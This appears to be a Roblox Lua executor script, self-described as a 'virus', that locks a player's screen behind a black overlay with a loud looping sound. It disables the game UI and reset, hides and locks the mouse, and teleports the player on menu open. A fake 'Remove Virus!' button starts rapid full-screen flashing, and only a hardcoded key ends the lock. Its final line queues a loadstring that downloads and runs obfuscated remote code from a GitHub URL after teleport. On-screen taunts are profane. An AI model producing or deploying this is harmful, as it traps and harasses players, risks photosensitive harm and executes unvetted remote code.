local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local UIS = game:GetService("UserInputService")

-- Screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackScreenWithDarkGrayBox"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- Black background
local blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0, 0, 0, 0)
blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blackFrame.BorderSizePixel = 0
blackFrame.BackgroundTransparency = 0
blackFrame.Parent = screenGui

-- Gray box
local grayBox = Instance.new("Frame")
grayBox.Size = UDim2.new(0, 300, 0, 150)
grayBox.AnchorPoint = Vector2.new(0.5, 0.5)
grayBox.Position = UDim2.new(0.5, 0, 0.5, 0)
grayBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
grayBox.BorderSizePixel = 0
grayBox.Parent = screenGui

local uicorner = Instance.new("UICorner")
uicorner.CornerRadius = UDim.new(0, 10)
uicorner.Parent = grayBox

-- Main Label
local originalText = "IMAGINE FUCKING GETTING AN ROBLOX SCRIPT VIRUS"
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, -20, 1, -20)
textLabel.Position = UDim2.new(0, 10, 0, 10)
textLabel.BackgroundTransparency = 1
textLabel.Text = originalText
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextWrapped = true
textLabel.Parent = grayBox

-- Key Label (green)
local keyLabel = Instance.new("TextLabel")
keyLabel.Size = UDim2.new(0, 50, 0, 30)
keyLabel.Position = UDim2.new(0.5, -150, 0.5, 80)
keyLabel.AnchorPoint = Vector2.new(0, 0)
keyLabel.BackgroundTransparency = 1
keyLabel.Text = "Key:"
keyLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- GREEN
keyLabel.Font = Enum.Font.SourceSansBold
keyLabel.TextScaled = true
keyLabel.Parent = grayBox

-- TextBox for player input (initially blank)
local keyTextBox = Instance.new("TextBox")
keyTextBox.Size = UDim2.new(0, 200, 0, 30)
keyTextBox.Position = UDim2.new(0.5, -75, 0.5, 80)
keyTextBox.AnchorPoint = Vector2.new(0, 0)
keyTextBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
keyTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
keyTextBox.PlaceholderText = ""  -- blank
keyTextBox.Text = ""             -- blank
keyTextBox.Font = Enum.Font.SourceSans
keyTextBox.TextScaled = true
keyTextBox.ClearTextOnFocus = false
keyTextBox.Parent = grayBox

-- Stop all sounds
for _, sound in ipairs(Workspace:GetDescendants()) do
	if sound:IsA("Sound") then
		sound:Stop()
	end
end

for _, sound in ipairs(playerGui:GetDescendants()) do
	if sound:IsA("Sound") then
		sound:Stop()
	end
end

-- Play the virus sound
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://5351101493"
sound.Volume = 10 
sound.Parent = playerGui

local playCount = 0
local maxPlays = math.huge

local function playSound()
	if playCount < maxPlays then
		sound:Play()
		playCount = playCount + 1
	end
end

sound.Ended:Connect(playSound)
playSound()

-- Disable CoreGui elements
StarterGui:SetCore("ResetButtonCallback", false)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Remove Virus button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 100, 0, 50)
button.Position = UDim2.new(1, -110, 1, -60)
button.AnchorPoint = Vector2.new(0, 0)
button.Text = "Remove Virus!"
button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.SourceSansBold
button.TextScaled = true
button.Parent = screenGui

-- Color toggle variables
local isSwitching = false
local isBlack = true
local stopToggle = false -- STOP toggle when ending script

local function toggleColors()
	while isSwitching and not stopToggle do
		wait(0.01)
		for _, obj in ipairs(screenGui:GetDescendants()) do
			if obj:IsA("Frame") or obj:IsA("TextLabel") or obj:IsA("TextButton") then
				if isBlack then
					obj.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					if obj:IsA("TextLabel") or obj:IsA("TextButton") then
						obj.TextColor3 = Color3.fromRGB(0, 0, 0)
					end
				else
					obj.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					if obj:IsA("TextLabel") or obj:IsA("TextButton") then
						obj.TextColor3 = Color3.fromRGB(255, 255, 255)
					end
				end
			end
		end
		isBlack = not isBlack
	end
end

-- Lock mouse
local function lockMouse()
	UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
	UIS.MouseIconEnabled = false
end

-- Detect ESC
UIS.InputBegan:Connect(function(input, processed)
	if input.KeyCode == Enum.KeyCode.Escape then
		lockMouse()
	end
end)

-- Remove Virus button click
button.MouseButton1Click:Connect(function()
	if not isSwitching then
		textLabel.Text = "BRO YOU THOUGHT YOU GOT OUT SIMPLE NAH BITCH A+ FOR EFFORT THOUGH"
		isSwitching = true
		button:Destroy()
		lockMouse()
		spawn(toggleColors)
		
		-- Hide Key label and textbox
		keyLabel.Visible = false
		keyTextBox.Visible = false
	end
end)

game:GetService("GuiService").MenuOpened:Connect(function() 
	game:GetService("TeleportService"):Teleport(game.PlaceId) 
end)

-- Secret Key
local secretKey = "BroStopTheVirusBitch"

-- Function to end everything
local function endScript()
	stopToggle = true -- stop toggle loop
	isSwitching = false

	if screenGui then
		screenGui:Destroy()
	end

	-- Stop all sounds
	for _, sound in ipairs(Workspace:GetDescendants()) do
		if sound:IsA("Sound") then
			sound:Stop()
		end
	end

	for _, sound in ipairs(playerGui:GetDescendants()) do
		if sound:IsA("Sound") then
			sound:Stop()
		end
	end

	-- Re-enable CoreGui
	StarterGui:SetCore("ResetButtonCallback", true)
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)

	-- Unlock mouse
	UIS.MouseBehavior = Enum.MouseBehavior.Default
	UIS.MouseIconEnabled = true
end

-- Detect Enter in TextBox
keyTextBox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local playerKey = keyTextBox.Text
		if playerKey == secretKey then
			textLabel.Text = "Correct Key! Virus Neutralized."
			endScript()
		else
			textLabel.Text = "Wrong Key! Bitch Try Again."
			textLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- RED
			keyTextBox.Text = ""
			-- Reset after 4 seconds
			task.delay(4, function()
				if textLabel.Text ~= "Correct Key! Virus Neutralized." then
					textLabel.Text = originalText
					textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- WHITE
				end
			end)
		end
	end
end)

queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Executioner11/Best-Script-/refs/heads/main/--%5B%5B%20v1.0.0%20httpswearedevs.netobfus.txt"))()')
